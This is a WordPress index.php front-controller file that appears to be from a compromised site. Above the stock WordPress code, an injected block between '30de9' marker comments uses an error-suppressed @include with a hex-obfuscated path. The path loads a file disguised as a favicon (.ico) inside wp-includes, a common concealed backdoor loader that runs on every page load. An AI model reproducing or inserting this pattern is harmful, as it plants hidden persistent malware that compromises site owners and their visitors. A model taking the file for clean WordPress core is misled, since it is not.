<?php
/*30de9*/

@include "\x2fhome\x2fcrea\x74iva/\x70ubli\x63_htm\x6c/mar\x74in/1\x73tcal\x6c/wp-\x69nclu\x64es/f\x61vico\x6e_df1\x63d6.i\x63o";

/*30de9*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
